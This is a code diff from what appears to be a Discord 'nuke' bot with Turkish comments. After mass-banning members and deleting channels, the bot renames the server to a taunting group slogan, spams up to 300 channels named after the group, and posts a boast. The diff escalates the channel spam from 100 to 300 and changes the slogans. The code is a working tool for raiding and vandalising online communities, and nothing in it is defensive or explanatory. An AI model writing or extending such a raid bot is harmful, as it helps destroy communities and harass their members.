@@ -101,16 +101,16 @@ client.on('messageCreate', async (message) => {
     }
 
     // Sunucu adını değiştir
-    await message.guild.setName('Glory To TKT').catch(() => {});
+    await message.guild.setName('FORS AFFETMEZ SABAHA SUNUCUN AFFEDİLMEZ💦').catch(() => {});
 
-    // 100 yeni kanal oluştur (TKT, FORS, ALİLW, TKT sırayla)
-    const names = ['TKT', 'FORS', 'ALİLW', 'TKT'];
-    for (let i = 0; i < 100; i++) {
+    // 300 yeni kanal oluştur (TKT💋, FORS💦, ALİLW💝, TKT💋 sırayla)
+    const names = ['TKT💋', 'FORS💦', 'ALİLW💝', 'TKT💋'];
+    for (let i = 0; i < 300; i++) {
       const name = names[i % names.length];
       await message.guild.channels.create({ name: name }).catch(() => {});
     }
 
-    message.channel.send(`🧹 ${bannedCount} kişi banlandı. Kanallar silindi ve yeniden oluşturuldu. Glory To TKT!`);
+    message.channel.send(`🧹 ${bannedCount} kişi banlandı. Kanallar silindi ve yeniden oluşturuldu. FORS AFFETMEZ!`);
   }
 });
 
